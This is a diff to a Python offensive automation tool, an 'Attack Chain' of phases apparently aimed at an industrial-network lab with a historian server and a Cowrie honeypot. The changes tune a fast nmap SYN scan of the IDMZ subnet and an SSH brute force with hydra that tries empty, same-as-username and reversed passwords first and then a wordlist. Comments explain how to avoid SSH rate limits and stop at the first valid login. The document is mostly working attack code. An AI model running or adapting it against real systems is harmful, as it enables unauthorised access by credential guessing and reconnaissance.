@@ -50,10 +50,7 @@ from rich.panel import Panel
 from rich.table import Table
 from rich.rule import Rule
 from rich.prompt import Confirm, Prompt
-from rich.progress import (
-    Progress, SpinnerColumn, BarColumn,
-    TextColumn, TimeElapsedColumn, TaskProgressColumn
-)
+from rich.progress import Progress
 from rich.markup import escape
 from rich.text import Text
 import paramiko
@@ -120,7 +117,7 @@ ASCII_BANNER = (
     "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
     "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
     "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
-    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                   \n"
+    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
 )
 
 def banner():
@@ -158,7 +155,7 @@ def info(msg: str):
 
 
 def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
-    """Run a shell command, return (returncode, stdout+stderr)."""
+    """Run a shell command silently, return (returncode, stdout+stderr)."""
     console.print(f"[dim]$ {escape(cmd)}[/dim]")
     try:
         proc = subprocess.run(
@@ -171,6 +168,71 @@ def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, st
         return proc.returncode, proc.stdout
     except subprocess.TimeoutExpired:
         return -1, "TIMEOUT"
+
+
+def stream_cmd(
+    cmd: str,
+    timeout: int = 300,
+    line_filter=None,
+    stop_sentinel: str | None = None,
+) -> tuple[int, str]:
+    """
+    Stream a command's output line-by-line with live display.
+    line_filter(line) -> rich markup string, or None to use dim default.
+    stop_sentinel: kill the process immediately if this string appears in a line
+    (used for hydra -f workaround so we don't wait for the process to flush).
+    """
+    console.print(f"[dim]$ {escape(cmd)}[/dim]")
+    lines: list[str] = []
+    start = time.monotonic()
+
+    proc = subprocess.Popen(
+        cmd, shell=True,
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        text=True, bufsize=1,
+    )
+
+    try:
+        for raw in proc.stdout:
+            line = raw.rstrip()
+            if not line:
+                continue
+            lines.append(line)
+            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
+            console.print(styled)
+            if stop_sentinel and stop_sentinel in line:
+                proc.terminate()
+                break
+    except Exception:
+        pass
+    finally:
+        proc.wait()
+
+    elapsed = time.monotonic() - start
+    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
+    return proc.returncode, "\n".join(lines)
+
+
+def _nmap_filter(line: str) -> str:
+    lo = line.lower()
+    if "nmap scan report" in lo:
+        return f"[bold cyan]{escape(line)}[/bold cyan]"
+    if "/tcp" in lo and "open" in lo:
+        return f"[green]{escape(line)}[/green]"
+    if "host is up" in lo:
+        return f"[dim green]{escape(line)}[/dim green]"
+    return f"[dim]{escape(line)}[/dim]"
+
+
+def _hydra_filter(line: str) -> str:
+    lo = line.lower()
+    if "login:" in lo and "password:" in lo:
+        return f"[bold green blink]{escape(line)}[/bold green blink]"
+    if "error" in lo or "failed" in lo:
+        return f"[dim red]{escape(line)}[/dim red]"
+    if "attempt" in lo:
+        return f"[dim]{escape(line)}[/dim]"
+    return f"[dim]{escape(line)}[/dim]"
 
 
 def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
@@ -203,6 +265,21 @@ def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[st
 
 def confirm_phase(title: str) -> bool:
     return Confirm.ask(f"\n[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)
+
+
+def preflight_check():
+    """Verify required system tools are installed before running any phase."""
+    tools = ["nmap", "hydra", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
+    missing = []
+    for tool in tools:
+        rc, _ = run_cmd(f"which {tool}", capture=False)
+        if rc != 0:
+            missing.append(tool)
+    if missing:
+        err(f"Missing tools: {', '.join(missing)}")
+        err("Install with: sudo apt-get install -y nmap hydra aircrack-ng")
+        sys.exit(1)
+    ok(f"Preflight OK — all tools found: {', '.join(tools)}")
 
 
 # ── Phase implementations ─────────────────────────────────────────────────────
@@ -253,7 +330,19 @@ def phase2_idmz_recon() -> PhaseResult:
     subnet = CFG["nmap"]["idmz_subnet"]
     ports  = CFG["nmap"]["ports"]
 
-    rc, out = run_cmd(f"nmap -sV -p {ports} --open {subnet}", timeout=120)
+    # -T4          aggressive timing (parallelise probes)
+    # -n           skip DNS resolution
+    # -sS          SYN scan (half-open, faster than full connect)
+    # --open       only print open ports
+    # -sV          version detection
+    # --version-intensity 0   grab banner only, no deep probing
+    # --min-rate 1000          send at least 1000 packets/sec on LAN
+    nmap_cmd = (
+        f"nmap -T4 -n -sS --open -sV --version-intensity 0 "
+        f"--min-rate 1000 -p {ports} {subnet}"
+    )
+    info("Fast SYN scan — should complete in ~5–10s on LAN")
+    rc, out = stream_cmd(nmap_cmd, timeout=60, line_filter=_nmap_filter)
 
     historian_found = CFG["historian"]["ip"] in out
     honeypot_found  = CFG["honeypot"]["ip"]  in out
@@ -268,7 +357,7 @@ def phase2_idmz_recon() -> PhaseResult:
         r.finding = "Historian not reachable"
 
     if honeypot_found:
-        warn(f"Cowrie honeypot detected at {CFG['honeypot']['ip']} — DO NOT target this host")
+        warn(f"[TRAP] Cowrie honeypot at {CFG['honeypot']['ip']} — DO NOT target this host")
 
     r.output = out[-2000:]
     return r
@@ -283,17 +372,28 @@ def phase3_hydra_brute() -> PhaseResult:
     wl   = CFG["hydra"]["wordlist"]
     t    = CFG["hydra"]["threads"]
 
-    ok(f"Running Hydra against {ip}:22  (user: {user})")
-    rc, out = run_cmd(
-        f"hydra -l {user} -P {wl} {ip} ssh -t {t} -V -f",
-        timeout=300
+    # -e nsr   try empty password, username-as-password, reversed username FIRST
+    #          (finds admin/admin or admin/nimda before touching rockyou.txt)
+    # -f       stop immediately on first valid credential
+    # -t 6     6 parallel SSH threads (sweet spot — avoids SSH rate limits)
+    # -V       verbose: print each attempt so we see live progress
+    hydra_cmd = f"hydra -l {user} -e nsr -P {wl} -t 6 -f -V {ip} ssh"
+
+    info(f"Trying quick credential variations first (-e nsr), then wordlist")
+    info(f"Will stop the moment a hit is found (-f)")
+
+    rc, out = stream_cmd(
+        hydra_cmd,
+        timeout=300,
+        line_filter=_hydra_filter,
+        stop_sentinel="[32][ssh]",   # hydra success line prefix
     )
 
-    if "login:" in out and "password:" in out:
-        cred_lines = [l for l in out.splitlines() if "login:" in l and "password:" in l]
-        r.finding  = cred_lines[0] if cred_lines else "Credentials found"
-        r.status   = "success"
-        ok(r.finding)
+    cred_lines = [l for l in out.splitlines() if "login:" in l and "password:" in l]
+    if cred_lines:
+        r.finding = cred_lines[0]
+        r.status  = "success"
+        ok(f"Credentials found: {r.finding}")
     else:
         r.status  = "failed"
         r.finding = "No credentials found with given wordlist"
@@ -535,45 +635,39 @@ def main():
     args = parser.parse_args()
 
     banner()
+    preflight_check()
 
-    selected = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
+    selected   = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
+    chain_start = time.monotonic()
 
-    with Progress(
-        SpinnerColumn(),
-        TextColumn("[bold cyan]{task.description}"),
-        BarColumn(bar_width=30),
-        TaskProgressColumn(),
-        TimeElapsedColumn(),
-        console=console,
-        transient=False,
-    ) as progress:
-        overall = progress.add_task(
-            "Attack Chain", total=len(PHASES)
+    for n, title, fn in PHASES:
+        if n not in selected:
+            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
+            continue
+
+        if not args.auto and not confirm_phase(f"Phase {n}/{len(PHASES)}: {title}"):
+            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
+            continue
+
+        phase_start = time.monotonic()
+        r = fn()
+        phase_elapsed = time.monotonic() - phase_start
+        results.append(r)
+
+        # Per-phase elapsed time — always shown, no fake progress bar
+        status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
+        console.print(
+            f"\n[dim]Phase {n} complete — "
+            f"[{status_color}]{r.status.upper()}[/{status_color}]  "
+            f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
         )
 
-        for n, title, fn in PHASES:
-            progress.update(overall, description=f"Phase {n}: {title}")
+        if r.status == "failed" and not args.auto:
+            if not Confirm.ask("[red]Phase failed — continue?[/red]", default=True):
+                break
 
-            if n not in selected:
-                results.append(PhaseResult(title, status="skipped", finding="Not selected"))
-                progress.advance(overall)
-                continue
-
-            if not args.auto and not confirm_phase(f"Phase {n}: {title}"):
-                results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
-                progress.advance(overall)
-                continue
-
-            r = fn()
-            results.append(r)
-            progress.advance(overall)
-
-            if r.status == "failed" and not args.auto:
-                if not Confirm.ask("[red]Phase failed — continue to next phase?[/red]", default=True):
-                    break
-
-        progress.update(overall, description="[green]Complete[/green]")
-
+    chain_elapsed = time.monotonic() - chain_start
+    console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
     print_report()
 
 
